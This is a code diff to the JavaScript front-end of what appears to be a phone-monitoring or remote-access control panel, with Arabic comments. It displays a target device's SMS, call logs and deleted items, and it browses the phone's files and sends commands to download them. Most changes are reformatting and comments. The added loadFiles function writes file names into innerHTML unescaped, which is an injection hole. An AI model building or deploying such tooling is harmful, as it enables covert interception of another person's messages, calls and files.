@@ -52,7 +52,10 @@ function checkNewSMS(newSMS) {
         const s = newSMS[0];
         showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
         const badge = document.getElementById('smsCount');
-        if (badge) { badge.textContent = `(${newSMS.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${newSMS.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastSmsCount = newSMS.length;
 }
@@ -63,7 +66,10 @@ function checkNewCalls(newCalls) {
         const c = newCalls[0];
         showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
         const badge = document.getElementById('callCount');
-        if (badge) { badge.textContent = `(${newCalls.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${newCalls.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastCallCount = newCalls.length;
 }
@@ -75,7 +81,10 @@ function checkNewDeleted(deleted) {
         const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
         showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
         const badge = document.getElementById('deletedCount');
-        if (badge) { badge.textContent = `(${deleted.length}) 🔴`; badge.className = 'count badge-new'; }
+        if (badge) {
+            badge.textContent = `(${deleted.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
     }
     lastDeletedCount = deleted.length;
 }
@@ -175,6 +184,7 @@ async function updateLiveData() {
     } catch (e) {}
 }
 
+// ✅ البيانات الأساسية فورًا
 async function loadAllData() {
     if (!currentDevice) return;
     await loadCalls();
@@ -183,7 +193,7 @@ async function loadAllData() {
     await loadDeviceInfo();
 }
 
-// ✅ التبديل مع التحميل التلقائي
+// ✅ التحميل عند فتح التبويب فقط
 function switchTab(tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
@@ -203,6 +213,7 @@ function switchTab(tabName) {
 
 // ============ مدير الملفات ============
 
+// ✅ تحميل قائمة الملفات
 async function loadFileList(path) {
     try {
         currentFilePath = path;
@@ -219,22 +230,23 @@ async function loadFileList(path) {
             })
         });
         
-        // ✅ انتظر ثم اعرض
+        // ✅ انتظر قليلًا ثم اعرض
         setTimeout(async () => {
             const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
             const data = await response.json();
-            displayFileList(data.files || []);
-        }, 5000);
+            displayFileList(data.files || data);
+        }, 3000);
     } catch (e) {}
 }
 
+// ✅ عرض قائمة الملفات
 function displayFileList(files) {
     const div = document.getElementById('filesList');
     if (!div) return;
     div.innerHTML = '';
     
     if (!files || files.length === 0) {
-        div.innerHTML = '<p style="color:#888;">المجلد فارغ — اضغط 🔄 تحديث</p>';
+        div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
         return;
     }
     
@@ -270,24 +282,33 @@ function displayFileList(files) {
     });
 }
 
+// ✅ تحميل ملف من الهاتف
 async function downloadPhoneFile(path) {
     await fetch('/api.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
+        body: JSON.stringify({
+            device: currentDevice,
+            command: `download_file:${path}`
+        })
     });
     alert('✅ تم طلب التحميل');
 }
 
+// ✅ عرض ملف
 async function viewPhoneFile(path) {
     await fetch('/api.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ device: currentDevice, command: `download_file:${path}` })
+        body: JSON.stringify({
+            device: currentDevice,
+            command: `download_file:${path}`
+        })
     });
     alert('✅ جاري التحميل للعرض');
 }
 
+// ✅ الانتقال للأعلى
 function navigateUp() {
     const parts = currentFilePath.split('/');
     parts.pop();
@@ -301,6 +322,7 @@ async function loadDeleted() {
     try {
         const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
         const deleted = await response.json();
+        
         if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
             checkNewDeleted(deleted);
             allDeleted = deleted;
@@ -309,9 +331,45 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
+async function loadFiles() {
+    try {
+        const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
+        const files = await response.json();
+        
+        const div = document.getElementById('filesList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!files || files.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد ملفات محملة</p>';
+            document.getElementById('filesCount').textContent = '(0)';
+            return;
+        }
+        
+        [...files].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(file => {
+            const divItem = document.createElement('div');
+            divItem.className = 'conversation-item';
+            divItem.innerHTML = `
+                <div class="conversation-avatar">📄</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${file.name || 'ملف'}</div>
+                    <div class="conversation-preview">المسار: ${file.path || ''}</div>
+                    <div class="conversation-preview">الحجم: ${formatBytes(file.size)}</div>
+                </div>
+                <div class="conversation-time">${formatDate(file.date)}</div>
+            `;
+            div.appendChild(divItem);
+        });
+        
+        document.getElementById('filesCount').textContent = `(${files.length})`;
+    } catch (e) {}
+}
+
 function displayDeleted() {
     const div = document.getElementById('deletedList');
     if (!div) return;
+    
     div.innerHTML = '';
     
     if (!allDeleted || allDeleted.length === 0) {
